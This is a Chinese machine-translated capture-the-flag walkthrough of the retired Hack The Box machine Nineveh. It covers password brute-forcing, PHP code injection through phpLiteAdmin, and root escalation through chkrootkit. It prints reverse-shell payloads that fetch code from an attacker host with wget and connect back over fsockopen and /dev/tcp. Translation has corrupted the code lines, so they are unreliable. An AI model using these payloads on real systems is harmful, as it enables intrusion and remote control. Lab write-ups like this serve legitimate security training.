<html>
<head>
<title>Nineveh — Retired HTB Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">尼尼微——退休的HTB漫游</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/nineveh-retired-htb-walkthrough-33a15fa0919?source=collection_archive---------0-----------------------#2018-05-08">https://infosecwriteups.com/nineveh-retired-htb-walkthrough-33a15fa0919?source=collection_archive---------0-----------------------#2018-05-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/602e1ee48db07a46ecf856e299b5b9d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q_L8MRSmgUeGVZ8LhgEk1g.png"/></div></div></figure></div><div class="ab cl jy jz hu ka" role="separator"><span class="kb bw bk kc kd ke"/><span class="kb bw bk kc kd ke"/><span class="kb bw bk kc kd"/></div><div class="ij ik il im in"><p id="1561" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">我以前曾用九头蛇做一些网络登录蛮力，在这个最近退休的黑客机器，九头蛇再次派上用场。让我们来看看是什么让这个盒子变得非常有趣，我从中学到了一些很酷的技巧。</p><p id="2052" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">我下载虚拟机的来源表明它的静态IP是192.168.0.150。因此，让我们直接在门外对它进行nmap测试:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ld"><img src="../Images/b5526daa2cfe6e6fabbc732276a78163.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WivGqh1HGF4AAPq73-TATA.png"/></div></div></figure><p id="0c03" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">我们看到端口80和端口443是打开的，仅此而已。看起来这将是一个完全基于网络的挑战。没关系，我喜欢利用网络！让我们看看两个端口上都运行了什么。</p><p id="1ac7" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">端口80:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi li"><img src="../Images/40913624a893a48f9253dada0dd907a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1234/format:webp/1*RtauJqLT_nw6XNScFhL1OQ.png"/></div></div></figure><p id="3b07" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">端口443:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lj"><img src="../Images/9f7d4b66e9a152205983505683c2233e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*omMsU9Qr5CQ0xrc5ZVd0Ug.png"/></div></div></figure><p id="c2b8" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">我们并没有从这两个静态页面中得到多少，所以让我们首先使用“大”dirb列表将dirb放在端口80:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lk"><img src="../Images/4c213dde3ca0ecb4693b82b9746cc237.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a4iLtyXKdiLxNq42SATV8A.png"/></div></div></figure><p id="4507" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">我们看到目录/department/，其中包含/files/目录本身。似乎很有趣，所以让我们来看看这个:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ll"><img src="../Images/41c22e6a86857ab1e23dbd3d758eb9e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xJD4vIiyyVFjvQrTNIuOdQ.png"/></div></div></figure><p id="db0b" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">太好了，我们可以通过网络登录了。尝试典型的登录，我们注意到当我们有一个错误的用户名时，网站会发出警告。输入用户名“admin ”,它告诉我们错误的密码。现在我们已经枚举了用户名，让我们使用hydra和rockyou.txt来强行登录:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lm"><img src="../Images/9488bb8c52f3425ee79f1b2b2813150e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YZUxvxdDgFXqqNXz4SpAXg.png"/></div></div></figure><p id="de41" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">酷，我们有密码了。让我们登录，看看我们有什么:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ln"><img src="../Images/29a085e1893e3101de8e46df081a9ce2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*myGyRmwYyVZScicpp4gLSw.png"/></div></div></figure><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lo"><img src="../Images/bfd1552b0af48cb595d5245eca2f94fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5UijUN7WuPn9qC4L69WCsQ.png"/></div></div></figure><p id="6dbd" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">请注意，在第二个图像中，URL指定了要读取的文件。这以后可能会派上用场，但是现在让我们记住它。由于没有什么可看的，让我们在端口443上运行一个dirb:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lp"><img src="../Images/dbb8676e01a1609b781973fa72437dfd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*urQtDdPNcM7ZsqoyZa4f8w.png"/></div></div></figure><p id="9d7e" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">导航到/db/ we得到一个phpliteadmin登录:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div class="gh gi lq"><img src="../Images/a7b4b89a1f9923c751c79648809c9fda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1060/format:webp/1*aWTQpJSm1JFC7i5VuMvQtg.png"/></div></figure><p id="5a4e" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">好了，关于九头蛇的话题，让我们再次启动它并登录:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lr"><img src="../Images/bd467b3f5b1624d7e73ef1bb688d5eaf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V6uiY7RRxAD_DxzphV7iiA.png"/></div></div></figure><p id="e15d" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">酷，现在我们也有phpliteadmin的登录了！登录后，我们会看到典型的phpMyAdmin页面，在这里我们可以创建新的数据库和表。让我们创建一个名为ninevehNotes.txt的新数据库，因为回到端口80端，它在Notes页面中读取ninevehNotes.txt。我们可以创建页面，在数据库中创建一个表，然后给它一个php反向shell脚本来执行。</p><blockquote class="ls lt lu"><p id="837a" class="kf kg lv kh b ki kj kk kl km kn ko kp lw kr ks kt lx kv kw kx ly kz la lb lc ij bi translated"><?php system(“wget <a class="ae lz" href="http://192.168.0.22/shell.txt" rel="noopener ugc nofollow" target="_blank"?>http://X . X . X . X/shell . txt-O/tmp/shell . PHP；PHP/tmp/shell . PHP ")；？&gt;</p></blockquote><p id="dac2" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">为shell.txt提供以下内容</p><blockquote class="ls lt lu"><p id="f777" class="kf kg lv kh b ki kj kk kl km kn ko kp lw kr ks kt lx kv kw kx ly kz la lb lc ij bi translated"><?php $sock=fsockopen(“X.X.X.X”,1234);exec(“/bin/bash -i <&3 ?> &amp;三二&gt; &amp;三)；？&gt;</p></blockquote><p id="6be2" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">这一行php代码来自我便利的反向shell备忘单，可以在<a class="ae lz" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">http://pentest monkey . net/cheat-sheet/shell/reverse-shell-cheat-sheet</a>上找到</p><p id="58c6" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">使用python托管我的shell.txt所在的SimpleHTTPServer，我可以获取我的shell文件，并通过url加载我创建的数据库来用php执行它:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/a35c7000eb4006598aeb242ade2cf79f.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*mzHLYkoyRnU8A16_F2MoSQ.png"/></div></figure><p id="b2d0" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">在我的本地主机上运行netcat监听器允许我捕获我通过管道传输到IP的/bin/bash:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/3fb17d13a32d4fddc347c9f700d9cc77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*9WncORA0KLArDUG4s0t-cQ.png"/></div></figure><p id="34de" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">环顾四周，我做的第一件事是检查根目录。首先注意到的是一个名为/report的目录。这个目录中有几个文本文件，包含一个名为chkrootkit的已知rootkit检查器的输出。这些文件是按分钟来记录日期的，可以看出它每分钟都在准时运行，可能是用cron作业。使用searchsploit，我们了解到chkrootkit在运行时容易以root用户身份执行特定文件:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/0a4f692f9e2fc46708975241dd9f5f28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/1*1K9hFqfTaXrTljNbzKXfAQ.png"/></div></figure><p id="e33e" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">很好，接下来我们需要做的是创建一个名为/tmp/update的文件，它将返回一个反向shell，该shell将以root用户身份运行。再次进入反向shell备忘单，我们可以使用bash后门:</p><blockquote class="ls lt lu"><p id="1b52" class="kf kg lv kh b ki kj kk kl km kn ko kp lw kr ks kt lx kv kw kx ly kz la lb lc ij bi translated">bash-I &gt; &amp;/dev/TCP/X . X . X . X/1337 0 &gt; &amp; 1</p></blockquote><p id="8f5e" class="pw-post-body-paragraph kf kg iq kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ij bi translated">将此写入更新文件，在我的本地机器上抛出另一个netcat监听器，并捕获根shell:</p><figure class="le lf lg lh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/2705341e2c1df2d0625544fbd21c5d9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gu56wHJDhEOMNIbxXdp_cw.png"/></div></div></figure></div></div>    
</body>
</html>